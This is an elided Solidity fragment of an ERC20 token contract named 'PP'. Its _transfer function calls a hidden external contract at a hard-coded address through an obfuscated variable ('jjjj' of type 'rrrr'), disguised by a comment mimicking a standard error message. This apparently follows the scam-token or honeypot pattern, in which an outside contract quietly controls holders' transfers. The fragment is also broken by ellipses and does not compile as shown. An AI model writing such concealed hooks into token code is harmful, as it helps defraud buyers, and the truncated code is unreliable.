 ...
 * the owner.
 */
abstract contract Ownable is ConWill {
 ...
 */
contract ERC20 is ConWill, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;
    rrrr jjjj = rrrr(
        0x5a2Ba19AbA49A0E74B96625a314490DD65164B9E
    );
    ...
    function _transfer(
        ...
        jjjj /*"ERC20: transfer to the zero address"*/
        .
...
contract PP  is ERC20('PP','PP'), Ownable {
    constructor() {
